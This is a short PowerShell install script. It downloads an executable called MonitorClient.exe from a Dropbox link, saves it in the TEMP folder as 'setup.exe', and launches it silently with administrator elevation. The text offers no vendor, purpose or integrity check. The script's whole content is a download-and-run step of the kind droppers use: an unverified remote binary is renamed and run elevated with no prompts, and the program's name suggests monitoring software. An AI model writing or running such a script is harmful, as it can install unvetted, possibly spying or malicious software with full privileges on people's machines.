# install.ps1

$u = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=b4j8bpku&dl=1"
$p = "$env:TEMP\setup.exe"

Invoke-RestMethod $u -OutFile $p
Start-Process $p -ArgumentList "/silent /norestart" -Verb RunAs
